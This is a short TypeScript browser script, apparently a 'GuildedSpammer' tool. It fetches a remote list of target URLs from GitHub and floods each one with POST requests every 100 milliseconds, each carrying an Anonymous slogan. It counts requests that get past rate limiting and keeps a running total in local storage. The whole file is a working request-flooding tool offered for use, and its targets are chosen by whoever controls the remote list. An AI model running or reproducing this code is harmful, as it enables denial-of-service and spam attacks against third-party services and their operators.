let num = parseInt(window.localStorage.getItem("session-counter") ?? "0");
let cursessionnum = 0;
function startSpam(urls: Array<string>) {
    for (let i = 0; i < urls.length; i++) {
        setInterval(spam, 100, urls[i]);
    }
}

function syncToLocalStorage() {
    window.localStorage.setItem("session-counter", num.toString());
}

function spam(url: string) {
    if (url === ""){return;}
    fetch(
        url,
        {
            method: 'POST',
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({content: "We are Anonymous. We are Legion. We do not forgive. We do not forget. Expect us."})
        }
    ).then(
        (response) => {
            if (response.status !== 429) {
                document.getElementById("session-counter").innerText = `We have sent ${++cursessionnum} non-429 requests in this session`;
                document.getElementById("total-counter").innerText = `We have sent ${++num} non-429 requests in total`;
            }
        }
    ).catch(error => {});
}

(async () => {
    let urls: string = await fetch("https://raw.githubusercontent.com/thefightagainstmalware/GuildedSpammer/main/urls.txt").then(res => res.text());
    startSpam(urls.split("\n"));
})().catch(err => {
    console.error(err);
});
setInterval(syncToLocalStorage, 1000);
